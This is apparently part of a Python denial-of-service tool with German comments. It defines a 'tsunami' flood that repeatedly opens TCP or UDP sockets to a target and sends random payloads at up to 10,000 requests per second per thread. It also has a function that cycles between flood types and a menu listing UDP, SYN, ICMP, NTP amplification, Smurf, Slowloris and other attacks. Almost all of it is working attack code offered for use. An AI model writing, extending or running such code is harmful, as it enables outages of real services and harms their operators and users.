# Neuer Tsunami-Angriff mit anpassbaren RPS und Protokollauswahl
def tsunami_attack(ip, port, duration, threads):
    lock = Lock()
    stats = {"requests_sent": 0}

    protocol = input(colored("Select protocol (TCP/UDP): ", COLORS["info"])).lower()
    payload = random._urandom(get_packet_size())

    def attack():
        nonlocal stats
        timeout = time.time() + duration
        rps = int(input(colored("Enter requests per second (RPS, Max: 10000): ", COLORS["info"])))
        rps = min(rps, 10000)

        while time.time() < timeout:
            try:
                for _ in range(rps):
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM if protocol == "tcp" else socket.SOCK_DGRAM) as sock:
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        sock.connect((ip, port))
                        sock.send(payload)
                        with lock:
                            stats["requests_sent"] += 1
            except Exception:
                continue

    print(colored(f"Starting TSUNAMI attack on {ip}:{port} with protocol {protocol.upper()} and RPS adjustment.", COLORS["menu"]))
    threads_list = [Thread(target=attack) for _ in range(threads)]
    for thread in threads_list:
        thread.start()

    for thread in threads_list:
        thread.join()
    print(colored(f"\nTSUNAMI attack completed. Requests sent: {stats['requests_sent']}", COLORS["success"]))

# Zyklischer Angriff auf verschiedene Methoden
def cycle_attacks(ip, port, duration, threads, attack_types):
    timeout = time.time() + duration
    while time.time() < timeout:
        for attack_type in attack_types:
            print(colored(f"Switching to {attack_type.upper()} attack.", COLORS["info"]))
            execute_attack(ip, port, 10, threads, attack_type)  # 10 Sekunden pro Angriff

# Hauptmenü anpassen
def main():
    while True:
        show_banner()
        print(colored("1. UDP Flood", COLORS["menu"]))
        print(colored("2. ICMP Flood", COLORS["menu"]))
        print(colored("3. SYN Flood", COLORS["menu"]))
        print(colored("4. CharGEN Flood", COLORS["menu"]))
        print(colored("5. NTP Amplification", COLORS["menu"]))
        print(colored("6. Smurf Attack", COLORS["menu"]))
        print(colored("7. Ping of Death", COLORS["menu"]))
        print(colored("8. Slowloris", COLORS["menu"]))
        print(colored("9. HTTP Flood", COLORS["menu"]))
        print(colored("10. RUDY Attack", COLORS["menu"]))
        print(colored("11. Bandwidth Exhaustion", COLORS["menu"]))
        print(colored("12. Advanced Persistent DoS (APDoS)", COLORS["menu"]))
        print(colored("13. Tsunami Attack (Custom RPS and Protocol)", COLORS["menu"]))
        print(colored("14. Cycle Attacks", COLORS["menu"]))
        print(colored("15. Exit", COLORS["menu"]))

        choice = input(colored("Select an option: ", COLORS["info"]))

        if choice in map(str, range(1, 15)):
            ip, port, duration = get_target_info()
            threads = get_threads()

            if choice == "1":
                execute_attack(ip, port, duration, threads, "udp")
            elif choice == "2":
                execute_attack(ip, port, duration, threads, "icmp")
            elif choice == "3":
                execute_attack(ip, port, duration, threads, "syn")
            elif choice == "13":
                tsunami_attack(ip, port, duration, threads)
            elif choice == "14":
                attack_types = ["udp", "syn", "icmp"]
                cycle_attacks(ip, port, duration, threads, attack_types)
        elif choice == "15":
            print(colored("Exiting... Goodbye!", COLORS["error"]))
            sys.exit()
        else:
            print(colored("Invalid choice. Please try again.", COLORS["error"]))

if __name__ == "__main__":
    main()
